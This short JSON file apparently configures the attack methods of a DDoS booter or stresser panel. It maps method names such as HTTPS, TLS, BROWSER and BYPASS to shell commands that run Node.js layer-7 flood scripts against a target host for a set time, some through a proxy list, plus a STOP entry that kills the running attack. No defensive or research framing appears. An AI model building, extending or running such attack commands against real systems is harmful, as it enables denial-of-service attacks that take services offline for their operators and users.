[
    {
        "methods": "HTTPS",
        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node https.js [HOST] [TIME] 8 2"
    },
    {
        "methods": "TLS",
        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node tls.js [HOST] [TIME] 8 2"
    },
    {
        "methods": "BROWSER",
        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node Eifol.js [HOST] [TIME] 8 4 proxy.txt"
    },
    {
        "methods": "BYPASS",
        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node bypass.js [HOST] [TIME] 8 4 proxy.txt"
    },
    {
        "methods": "STOP",
        "command": "pkill -f [SCREEN_NAME]"
    }
]